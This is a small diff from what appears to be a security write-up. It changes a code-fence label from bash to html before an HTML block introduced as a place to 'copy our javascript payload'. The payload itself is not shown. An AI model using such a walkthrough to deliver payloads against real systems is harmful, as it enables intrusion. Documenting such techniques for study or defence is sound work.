@@ -49,7 +49,7 @@ function loadXMLDoc(t){(xmlhttp=window.XMLHttpRequest?new XMLHttpRequest:new Act
 
 Then we copy our javascript payload and use:
 
-```bash
+```html
 <html>
 <head>
 </head>
